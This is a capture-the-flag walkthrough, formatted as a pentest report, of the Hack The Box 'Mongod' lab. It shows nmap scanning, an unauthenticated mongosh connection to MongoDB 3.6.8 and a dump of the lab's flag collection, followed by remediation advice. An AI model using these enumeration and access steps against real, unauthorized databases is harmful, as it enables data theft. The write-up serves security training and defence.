# HTB Starting Point Lab Walkthrough: Mongod (Linux Box)

## Executive Summary

- **Lab Objective**: Enumerate and exploit a MongoDB service on the target machine to retrieve a flag, simulating unauthenticated remote database access.
- **Target IP**: 10.129.204.253
- **Key Findings**: Identified an open MongoDB 3.6.8 instance on port 27017 with access control disabled, allowing unauthenticated read/write access to all databases. Retrieved a sensitive flag from the `sensitive_information` database.
- **Impact**: In a real-world scenario, unauthenticated database access could lead to complete data exposure, modification, or deletion, posing a critical risk to confidentiality and integrity.
- **Recommendations**: Enable authentication, restrict network access to trusted hosts, and upgrade to a supported MongoDB version.
- **Completion Date**: July 16, 2025
- **Tools Used**: Nmap, mongosh 2.3.2 (portable binary, Kali Linux)

## Methodology and Scope

This walkthrough follows a standard reconnaissance and exploitation process for the HTB Starting Point lab "Mongod." The scope was limited to port scanning, MongoDB service enumeration, and data access on the provided target IP. No advanced exploitation or privilege escalation was required.

Steps were performed in a controlled lab environment using Kali Linux. A key challenge was a version mismatch between modern MongoDB clients and the legacy server, resolved by using a portable mongosh 2.3.2 binary. Assumptions: Target is a Linux machine running MongoDB 3.6.8.

## Findings

### Finding 1: Open Ports and MongoDB Service Identification

- **Description**: MongoDB, a NoSQL database, was found running on port 27017. Two TCP ports (22/ssh, 27017/mongod) were open, with MongoDB identified as version 3.6.8.
- **Severity**: Informational (baseline enumeration).
- **Steps to Reproduce**:
    1. Perform a full port scan using Nmap:
        
        ```bash
        nmap -p- -T5 10.129.204.253
        ```
        
        Output:
        
        ```bash
        Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-16 07:33 EDT
        Nmap scan report for 10.129.204.253
        Host is up (0.020s latency).
        Not shown: 65533 closed tcp ports (reset)
        PORT      STATE SERVICE
        22/tcp    open  ssh
        27017/tcp open  mongod
        Nmap done: 1 IP address (1 host up) scanned in 8.41 seconds
        ```
        
    2. Confirm service version on port 27017:
        
        ```bash
        nmap -p 27017 -sV 10.129.204.253
        ```
        
        Output:
        
        ```bash
        Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-16 07:36 EDT
        Nmap scan report for 10.129.204.253
        Host is up (0.021s latency).
        PORT      STATE SERVICE VERSION
        27017/tcp open  mongodb MongoDB 3.6.8
        Nmap done: 1 IP address (1 host up) scanned in 6.32 seconds
        ```
        
- **Impact**: Confirms MongoDB is active and identifies the version, enabling targeted enumeration.
- **Evidence**: Nmap scan results above.
- **Remediation**: N/A (informational).

### Finding 2: Unauthenticated MongoDB Access

- **Description**: The MongoDB server (3.6.8) has access control disabled, allowing unauthenticated connections to read and write all databases. A legacy mongosh client (2.3.2) was required due to compatibility issues with modern clients.
- **Severity**: Critical (unauthenticated database access).
- **Steps to Reproduce**:
    1. Navigate to the directory containing the portable mongosh 2.3.2 binary:
        
        ```bash
        cd ~/htb/mongosh-2.3.2-linux-x64/bin
        ls -l
        ```
        
        Output:
        
        ```bash
        total 261712
        -rwxr-xr-x 1 reaper reaper 150977944 Oct  8  2024 mongosh
        -rwxr-xr-x 1 reaper reaper 117003624 Oct  8  2024 mongosh_crypt_v1.so
        ```
        
    2. Connect to the MongoDB server using the legacy binary:
        
        ```bash
        ./mongosh mongodb://10.129.204.253:27017
        ```
        
        Output:
        
        ```bash
        Current Mongosh Log ID:    6877a3d765bfecc065fe6910
        Connecting to:        mongodb://10.129.204.253:27017/?directConnection=true&appName=mongosh+2.3.2
        Using MongoDB:        3.6.8
        Using Mongosh:        2.3.2
        ------
        The server generated these startup warnings when booting
        2025-07-16T11:27:44.434+0000: 
        2025-07-16T11:27:44.434+0000: ** WARNING: Using the XFS filesystem is strongly recommended with the WiredTiger storage engine
        2025-07-16T11:27:44.434+0000: **          See http://dochub.mongodb.org/core/prodnotes-filesystem
        2025-07-16T11:27:46.729+0000: 
        2025-07-16T11:27:46.729+0000: ** WARNING: Access control is not enabled for the database.
        2025-07-16T11:27:46.729+0000: **          Read and write access to data and configuration is unrestricted.
        2025-07-16T11:27:46.729+0000:
        ------
        test> 
        ```
        
    3. List available databases:
        
        ```bash
        show dbs
        ```
        
        Output:
        
        ```bash
        admin                  32.00 KiB
        config                 72.00 KiB
        local                  72.00 KiB
        sensitive_information  32.00 KiB
        users                  32.00 KiB
        ```
        
- **Impact**: Unauthenticated access allows full read/write control over all databases, risking data exposure, modification, or deletion.
- **Evidence**: MongoDB connection and database listing above.
- **Remediation**: Enable access control with strong authentication; upgrade MongoDB to a supported version (3.6.8 is outdated).

### Finding 3: Data Exfiltration from Sensitive Database

- **Description**: Enumerated the `sensitive_information` database, identified a `flag` collection, and dumped its contents to retrieve a sensitive flag.
- **Severity**: Critical (successful data exfiltration).
- **Steps to Reproduce**:
    1. Switch to the `sensitive_information` database and list collections:
        
        ```bash
        use sensitive_information
        show collections
        ```
        
        Output:
        
        ```bash
        switched to db sensitive_information
        flag
        ```
        
    2. Dump the contents of the `flag` collection:
        
        ```bash
        db.flag.find()
        ```
        
        Output:
        
        ```bash
        [
          {
            _id: ObjectId('630e3dbcb82540ebbd1748c5'),
            flag: '1b6e6fb359e7c40241b6d431427ba6ea'
          }
        ]
        ```
        
- **Impact**: Access to sensitive data demonstrates a real-world data breach scenario, potentially exposing critical information.
- **Evidence**: Command outputs and flag value above.
- **Remediation**: Remove sensitive data from publicly accessible databases; implement role-based access controls.

## Recommendations

- Enable authentication and authorization in MongoDB configuration (e.g., `--auth` flag or `security.authorization: enabled`).
- Restrict network access to port 27017 using firewall rules, allowing only trusted hosts.
- Upgrade MongoDB to a supported version to mitigate known vulnerabilities in 3.6.8.
- Regularly scan for exposed database services using tools like Nmap or MongoDB-specific scripts (e.g., `mongodb-databases.nse`).
- For labs like this, practice using tools like Metasploit’s `mongodb_login` module to test for weak credentials.

## Appendices

- **Raw Notes/Logs**: (Optional—attach full session logs if sharing.)
- **Screenshots**: (Add here if available, e.g., terminal captures.)
- **Key Takeaway**: Tooling version mismatches (e.g., modern mongosh vs. legacy MongoDB) can complicate engagements. Using portable binaries can bypass dependency issues.